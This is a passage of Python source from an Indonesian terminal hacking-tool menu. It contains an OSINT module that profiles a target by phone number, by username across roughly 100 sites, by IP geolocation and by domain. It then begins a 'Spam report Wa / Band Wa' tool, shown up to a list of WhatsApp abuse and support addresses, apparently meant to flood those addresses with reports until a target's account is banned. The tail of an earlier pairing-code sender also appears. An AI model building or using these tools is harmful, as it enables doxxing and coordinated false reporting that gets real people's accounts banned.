        print(f"{W}│ [ {G}✓{W} ] Kode Pairing Berhasil Terkirim{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
        return
        
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Kembali Ke {G}Mikasa{W}...{N}")
        time.sleep(1)
        return

def tool_osint():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, re, socket
    from datetime import datetime
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone as phone_timezone
    import dns.resolver

    os.system('clear')

    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'

    def show_menu():
        os.system('clear')
        ascii_osint = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣀⣀⣄⣄⣠⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⢿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡟⠋⠀⡀⣄⣦⣾⡿⠁⢀⣴⣿⣿⣦⡀⠈⢻⣷⣦⣤⢀⠀⠙⢻⣿⣧⡄⢀⠀⢀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠃⠀⣠⣾⣾⣿⣿⣿⠁⠀⣾⣿⣿⣿⣿⣷⡀⠈⣻⣿⣿⣿⣶⣄⠀⠈⠿⣿⣿⣿⢿⢿⣿⣷⣧⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠋⠀⠀⠘⠛⠿⣿⣿⣿⠇⠀⣸⣿⣿⣿⣿⣿⣿⡧⠀⠨⣿⣿⡿⠟⠏⠃⠀⠀⠙⣿⣷⡄⠁⠀⠈⠙⢿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⠃⠀⣰⣷⣦⣄⣀⠀⠈⠊⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠁⠁⢀⢠⣠⣶⣾⣆⠀⠘⢿⣷⡀⠀⠀⣠⣿⡿⠀
⠀⠀⠀⠀⠀⠀⣼⣿⠇⠀⣰⣿⣿⣿⣿⣿⣿⣷⡆⠀⢠⣦⣤⣤⣤⣤⣤⣤⣦⡆⠀⢰⣿⣿⣿⣿⣿⣿⣿⡥⠀⠩⣿⣷⣠⣺⣾⠟⠀⠀
⠀⠀⠀⠀⠀⠠⣿⡿⠀⠠⣾⣿⣿⣿⣿⣿⣿⣿⠅⠀⢽⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⡄⣀⣽⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⡿⠟⠉⠀⢠⣴⡯⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⢿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡂⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣴⣿⣿⡿⠟⠛⠉⢀⣠⡆⠀⢰⣿⡏⠀⠀⠀⠀⠀
⠀⣴⣿⠟⠀⠐⣿⣟⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⠏⠋⠀⣀⣤⣶⣾⣿⣿⠁⠀⣺⣿⠇⠀⠀⠀⠀⠀
⢐⣿⣟⠀⠀⠀⢽⣿⣆⠀⠘⣿⣿⣿⣿⣿⣿⣿⣧⣤⣾⣿⣿⡿⡿⠟⠛⠉⠈⠀⠀⠠⢶⣿⣿⣿⣿⣿⣿⠇⠁⢰⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣶⣦⣦⣿⣿⣦⣶⣽⣿⣿⣿⡿⡿⠿⠻⠫⠋⠃⠁⡀⣄⣤⣦⣦⣦⠀⠀⣀⡀⠀⠁⠋⠻⡻⡓⠀⢠⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠈⠋⠋⠛⠙⠙⠙⠉⠉⠈⡀⣈⣀⣄⣤⣂⠀⠸⣿⣿⣿⣿⣿⣿⡏⠀⢐⣿⣿⣿⣶⣦⡀⠀⠀⣰⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣾⣶⣄⠀⠘⠻⣿⣿⣿⣷⡄⠀⢻⣿⣿⣿⣿⡿⠀⢀⣿⣿⣿⣿⠟⠃⠀⣠⣾⡿⠏⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣷⣤⡀⠀⠉⠻⢻⢷⣀⠀⠻⢿⡿⠟⠀⢀⡾⠿⠛⠍⠂⢀⣰⣼⣿⠯⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣶⣦⣄⡀⡀⠀⠀⠀⠀⠈⠀⠀⠀⠈⣀⣠⣤⣶⣿⠿⠫⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⡿⣿⣷⣷⣶⣶⣶⣶⣶⣿⣿⡷⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
        os.system(f'echo "{ascii_osint}" | lolcat 2>/dev/null || echo "{ascii_osint}"')

        print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}OSINT {R} │ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}[ {G}1{W} ] Osint Nomor Telepon
{W}│ {W}[ {G}2{W} ] Osint Username
{W}│ {W}[ {G}3{W} ] Osint IP Address
{W}│ {W}[ {G}4{W} ] Osint Checker Domain/Website
{W}│ {W}[ {G}0{W} ] Kembali
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
        print(f"{U}❯❯❯ {W}Pilih Menu{G}❯{W} ", end="")

    def load_bar(stop_event, text="Processing"):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] {text} [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    def get_platforms():
        return [
            ("Instagram", "https://instagram.com/{username}"),
            ("Twitter", "https://twitter.com/{username}"),
            ("Facebook", "https://facebook.com/{username}"),
            ("TikTok", "https://tiktok.com/@{username}"),
            ("YouTube", "https://youtube.com/@{username}"),
            ("GitHub", "https://github.com/{username}"),
            ("GitLab", "https://gitlab.com/{username}"),
            ("Reddit", "https://reddit.com/user/{username}"),
            ("Pinterest", "https://pinterest.com/{username}"),
            ("Tumblr", "https://tumblr.com/{username}"),
            ("LinkedIn", "https://linkedin.com/in/{username}"),
            ("Telegram", "https://t.me/{username}"),
            ("Steam", "https://steamcommunity.com/id/{username}"),
            ("Spotify", "https://open.spotify.com/user/{username}"),
            ("Medium", "https://medium.com/@{username}"),
            ("DeviantArt", "https://deviantart.com/{username}"),
            ("VK", "https://vk.com/{username}"),
            ("Snapchat", "https://snapchat.com/add/{username}"),
            ("Twitch", "https://twitch.tv/{username}"),
            ("Vimeo", "https://vimeo.com/{username}"),
            ("Dribbble", "https://dribbble.com/{username}"),
            ("Behance", "https://behance.net/{username}"),
            ("ProductHunt", "https://producthunt.com/@{username}"),
            ("Keybase", "https://keybase.io/{username}"),
            ("Pastebin", "https://pastebin.com/u/{username}"),
            ("Replit", "https://replit.com/@{username}"),
            ("HackerNews", "https://news.ycombinator.com/user?id={username}"),
            ("Gravatar", "https://gravatar.com/{username}"),
            ("Flickr", "https://flickr.com/people/{username}"),
            ("Imgur", "https://imgur.com/user/{username}"),
            ("SoundCloud", "https://soundcloud.com/{username}"),
            ("Mixcloud", "https://mixcloud.com/{username}"),
            ("Bandcamp", "https://bandcamp.com/{username}"),
            ("LastFM", "https://last.fm/user/{username}"),
            ("Genius", "https://genius.com/{username}"),
            ("Patreon", "https://patreon.com/{username}"),
            ("Kickstarter", "https://kickstarter.com/profile/{username}"),
            ("Gumroad", "https://gumroad.com/{username}"),
            ("Etsy", "https://etsy.com/shop/{username}"),
            ("Fiverr", "https://fiverr.com/{username}"),
            ("Upwork", "https://upwork.com/freelancers/{username}"),
            ("Freelancer", "https://freelancer.com/u/{username}"),
            ("AngelList", "https://angel.co/u/{username}"),
            ("Crunchbase", "https://crunchbase.com/person/{username}"),
            ("AboutMe", "https://about.me/{username}"),
            ("Linktree", "https://linktr.ee/{username}"),
            ("Beacons", "https://beacons.ai/{username}"),
            ("AllMyLinks", "https://allmylinks.com/{username}"),
            ("Solo", "https://solo.to/{username}"),
            ("Carrd", "https://{username}.carrd.co"),
            ("Webflow", "https://{username}.webflow.io"),
            ("Wix", "https://{username}.wixsite.com/{username}"),
            ("WordPress", "https://{username}.wordpress.com"),
            ("Blogger", "https://{username}.blogspot.com"),
            ("Ghost", "https://{username}.ghost.io"),
            ("Hashnode", "https://hashnode.com/@{username}"),
            ("Dev.to", "https://dev.to/{username}"),
            ("Quora", "https://quora.com/profile/{username}"),
            ("StackOverflow", "https://stackoverflow.com/users/story/{username}"),
            ("CodePen", "https://codepen.io/{username}"),
            ("JSFiddle", "https://jsfiddle.net/{username}"),
            ("CodeSandbox", "https://codesandbox.io/u/{username}"),
            ("Glitch", "https://glitch.com/@{username}"),
            ("Vercel", "https://vercel.com/{username}"),
            ("Netlify", "https://{username}.netlify.app"),
            ("Heroku", "https://{username}.herokuapp.com"),
            ("PythonAnywhere", "https://{username}.pythonanywhere.com"),
            ("PyPI", "https://pypi.org/user/{username}"),
            ("NPM", "https://npmjs.com/~{username}"),
            ("RubyGems", "https://rubygems.org/profiles/{username}"),
            ("Crates.io", "https://crates.io/users/{username}"),
            ("Docker Hub", "https://hub.docker.com/u/{username}"),
            ("GitHub Sponsors", "https://github.com/sponsors/{username}"),
            ("Open Collective", "https://opencollective.com/{username}"),
            ("Ko-fi", "https://ko-fi.com/{username}"),
            ("Buy Me A Coffee", "https://buymeacoffee.com/{username}"),
            ("PayPal", "https://paypal.me/{username}"),
            ("Venmo", "https://venmo.com/{username}"),
            ("CashApp", "https://cash.app/{username}"),
            ("Kick", "https://kick.com/{username}"),
            ("Rumble", "https://rumble.com/user/{username}"),
            ("Odysee", "https://odysee.com/@{username}"),
            ("LBRY", "https://lbry.tv/@{username}"),
            ("DTube", "https://d.tube/#!/c/{username}"),
            ("Minds", "https://minds.com/{username}"),
            ("Gab", "https://gab.com/{username}"),
            ("Parler", "https://parler.com/profile/{username}"),
            ("TruthSocial", "https://truthsocial.com/@{username}"),
            ("Gettr", "https://gettr.com/user/{username}"),
            ("Clubhouse", "https://clubhouse.com/@{username}"),
            ("Signal", "https://signal.me/#p/{username}"),
            ("Discord", "https://discord.com/users/{username}"),
            ("Slack", "https://slack.com/{username}"),
            ("Zoom", "https://zoom.us/{username}"),
            ("Google", "https://google.com/search?q={username}"),
            ("Bing", "https://bing.com/search?q={username}"),
            ("DuckDuckGo", "https://duckduckgo.com/?q={username}"),
            ("Yandex", "https://yandex.com/search/?text={username}"),
        ]

    def cek_nomor():
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan {G}Nomor Telepon{W} (contoh: +628123456789)")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
        nomor = input(f"{U}❯❯❯{W} Masukkan Nomor Telepon{G}❯{W} ").strip()

        if not nomor:
            print(f"{W}[ {R}??{W} ] Nomor tidak boleh kosong!{N}")
            return

        try:
            parsed = phonenumbers.parse(nomor, None)
            valid = phonenumbers.is_valid_number(parsed)
            possible = phonenumbers.is_possible_number(parsed)

            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}✓{W} Informasi Nomor{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}Nomor         {R}: {G}{nomor}{N}")
            print(f"{W}│ {W}Valid         {R}: {G}{'Ya' if valid else 'Tidak'}{N}")
            print(f"{W}│ {W}Possible      {R}: {G}{'Ya' if possible else 'Tidak'}{N}")
            print(f"{W}│ {W}Format E164   {R}: {G}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}{N}")
            print(f"{W}│ {W}Internasional {R}: {G}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}{N}")
            print(f"{W}│ {W}Nasional      {R}: {G}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}{N}")
            print(f"{W}│ {W}Kode Negara   {R}: {G}+{parsed.country_code}{N}")
            print(f"{W}│ {W}Negara        {R}: {G}{geocoder.description_for_number(parsed, 'id') or 'Tidak Diketahui'}{N}")
            print(f"{W}│ {W}Operator      {R}: {G}{carrier.name_for_number(parsed, 'id') or 'Tidak Diketahui'}{N}")
            print(f"{W}│ {W}Timezone      {R}: {G}{', '.join(phone_timezone.time_zones_for_number(parsed)) or 'Tidak Diketahui'}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

        except Exception as e:
            print(f"\n{R}✗ Error: {e}{N}")

        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

    def cek_username():
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan {G}Username{W} contoh{R}:{W} jokowi")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
        username = input(f"{U}❯❯❯{W} Masukkan Username{G}❯{W} ").strip()

        if not username:
            print(f"{W}[ {R}??{W} ] Username tidak boleh kosong!{N}")
            return

        platforms = get_platforms()
        total = len(platforms)

        print(f"\n{W}[ {G}!!{W} ] Scanning {total} platform...{N}")

        stop_loading = threading.Event()
        t = threading.Thread(target=load_bar, args=(stop_loading, f"Mengecek {username} di {total} platform"))
        t.daemon = True
        t.start()

        found = []

        for name, url_template in platforms:
            try:
                url = url_template.format(username=username)
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                resp = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
                if resp.status_code == 200:
                    found.append((name, url))
            except:
                pass

        stop_loading.set()
        t.join()

        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Hasil Pencarian Username: {G}{username}{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")

        if found:
            for name, url in found:
                print(f"{W}│ {W}✦ {G}{name:<20}{W}: {C}{url}{N}")
            print(f"{W}│ {W}Total ditemukan {R}: {G}{len(found)}{W} dari {total}{N}")
        else:
            print(f"{W}│ {W}[ {R}??{W} ] Tidak ditemukan di platform manapun{N}")

        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

    def cek_ip():
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan IP Target")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
        ip = input(f"{U}❯❯❯{W} Masukkan IP{G}❯{W} ").strip()

        if not ip:
            print(f"{W}[ {R}??{W} ] IP tidak boleh kosong!{N}")
            return

        try:
            stop_loading = threading.Event()
            t = threading.Thread(target=load_bar, args=(stop_loading, "Mengecek IP"))
            t.daemon = True
            t.start()

            url = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
            resp = requests.get(url, timeout=10)
            data = resp.json()

            stop_loading.set()
            t.join()

            if data.get('status') == 'fail':
                print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {W}[ {R}??{W} ]{W} {data.get('message', 'IP tidak valid')}{N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            else:
                print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {G}✓{W} Informasi IP{N}")
                print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}IP            {R}: {G}{data.get('query', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Negara        {R}: {G}{data.get('country', 'Tidak Diketahui')} ({data.get('countryCode', '')}){N}")
                print(f"{W}│ {W}Benua         {R}: {G}{data.get('continent', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Region        {R}: {G}{data.get('regionName', 'Tidak Diketahui')} ({data.get('region', '')}){N}")
                print(f"{W}│ {W}Kota          {R}: {G}{data.get('city', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Kode Pos      {R}: {G}{data.get('zip', 'Tidak Diketahui') or 'Tidak Diketahui'}{N}")
                print(f"{W}│ {W}Latitude      {R}: {G}{data.get('lat', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Longitude     {R}: {G}{data.get('lon', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Timezone      {R}: {G}{data.get('timezone', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}ISP           {R}: {G}{data.get('isp', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Organisasi    {R}: {G}{data.get('org', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}ASN           {R}: {G}{data.get('as', 'Tidak Diketahui')}{N}")
                print(f"{W}│ {W}Mobile        {R}: {G}{'Ya' if data.get('mobile') else 'Tidak'}{N}")
                print(f"{W}│ {W}Proxy/VPN     {R}: {G}{'Ya' if data.get('proxy') else 'Tidak'}{N}")
                print(f"{W}│ {W}Hosting       {R}: {G}{'Ya' if data.get('hosting') else 'Tidak'}{N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

        except Exception as e:
            stop_loading.set()
            t.join()
            print(f"\n{R}✗ Error: {e}{N}")

        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

    def cek_domain():
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ Masukkan Domain{U}/{W}Website contoh{R}:{W} google.com){N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
        domain = input(f"{U}❯❯❯ {W}Masukkan domain Website{G}❯{W} ").strip()

        if not domain:
            print(f"{W}[ {R}??{W} ] Domain tidak boleh kosong!{N}")
            return

        domain = domain.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]

        try:
            stop_loading = threading.Event()
            t = threading.Thread(target=load_bar, args=(stop_loading, "Mengecek Domain"))
            t.daemon = True
            t.start()

            try:
                ip = socket.gethostbyname(domain)
            except:
                ip = "Tidak Diketahui"

            whois_data = {}
            try:
                whois_resp = requests.get(f"https://api.vercel.app/whois?domain={domain}", timeout=10)
                if whois_resp.status_code == 200:
                    whois_data = whois_resp.json()
            except:
                pass

            stop_loading.set()
            t.join()

            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}✓{W} Informasi Domain{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}Domain        {R}: {G}{domain}{N}")
            print(f"{W}│ {W}IP Address    {R}: {G}{ip}{N}")
            print(f"{W}│ {W}Registrar     {R}: {G}{whois_data.get('registrar', 'Tidak Diketahui')}{N}")
            print(f"{W}│ {W}Creation Date {R}: {G}{whois_data.get('creation_date', 'Tidak Diketahui')}{N}")
            print(f"{W}│ {W}Expiration    {R}: {G}{whois_data.get('expiration_date', 'Tidak Diketahui')}{N}")
            print(f"{W}│ {W}Name Servers  {R}: {G}{', '.join(whois_data.get('name_servers', ['Tidak Diketahui']))}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")

        except Exception as e:
            stop_loading.set()
            t.join()
            print(f"\n{R}✗ Error: {e}{N}")

        input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

    while True:
        show_menu()
        pilih = input().strip()

        if pilih == "0":
            print(f"\n{W}[ {R}!{W} ] Back to Mikasa...{N}")
            break

        elif pilih == "1":
            cek_nomor()

        elif pilih == "2":
            cek_username()

        elif pilih == "3":
            cek_ip()

        elif pilih == "4":
            cek_domain()

        else:
            print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
            input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_spam_report():
    play_menu_sound()
    pantau_aktivitas()
    a = '\x1b[1;30m'
    m = '\x1b[1;31m'
    h = '\x1b[1;32m'
    k = '\x1b[1;33m'
    b = '\x1b[1;34m'
    u = '\x1b[1;35m'
    c = '\x1b[1;36m'
    p = '\x1b[1;37m'
    o = '\x1b[38;5;214m'
    r = '\x1b[0m'
    G = h
    N = r

    os.system('clear' if os.name == 'posix' else 'cls')

    def banner_Spammer():
        ascii_wa = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣴⣶⣶⣶⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⠉⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣿⡿⠟⠁⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⠏⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀
⠀⠀⣰⣿⡿⠁⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠹⣿⣷⡀⠀⠀
⠀⣰⣿⡟⠀⠀⢀⣾⣿⣿⣿⡟⠉⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠹⣿⣷⠀⠀
⢠⣿⣿⠁⠀⢀⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⢹⣿⣧⠀
⣼⣿⠇⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⣿⣿⡀
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣸⣿⡇
⢻⣿⡆⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠉⠛⠿⣿⠟⠀⠀⠀⠈⠛⠻⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⠁
⠘⣿⣷⡀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠇⠀⠀⣸⣿⡟⠀
⠀⠹⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠏⠀⠀⣰⣿⡿⠁⠀
⠀⠀⣿⣿⠇⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⣰⣿⡿⠁⠀⠀
⠀⢠⣿⡿⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⢠⣾⣿⠟⠀⠀⠀⠀
⠀⣼⣿⠇⠀⠀⠘⠛⠉⠉⠁⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⣠⣶⣿⡿⠁⠀⠀⠀⠀⠀
⢰⣿⡿⠀⠀⠀⠀⢀⣀⣠⣤⣄⣀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⢀⣠⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣷⣦⣶⣾⣿⣿⠿⠿⠿⠿⢿⣿⣷⣶⣤⣤⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠻⠿⠿⠿⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
        os.system(f'echo "{ascii_wa}" | lolcat')
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
        print(f"{W}│  Author {R}: {h}Rulzzz_06                                      {N}")
        print(f"{W}│  Tools  {R}: {h}Spam report Wa {R}/{h} Band Wa               {N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")

    def loadbar_ban(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 10
        color_index = 0

        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r {p} Sedang MemProses Spam Report │ [[{filled}{empty}{p}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1

        sys.stdout.write('\r' + ' ' * 100 + '\r')
        sys.stdout.flush()

    EMAIL_TARGETS = [
        'abuse@whatsapp.com',
        'support@support.whatsapp.com',
        'business@support.whatsapp.com',
        'report@support.whatsapp.com',
        'account@support.whatsapp.com',
        'accounts@support.whatsapp.com',
        'legal@support.whatsapp.com',
        'security@support.whatsapp.com',
        'bugreport@support.whatsapp.com',
        'support@whatsapp.com',
        'smb@support.whatsapp.com',
        'business@support.whatsapp.com',
        'WhatsApp@gmail.com',
        'Suporte@support.whatsapp.com',
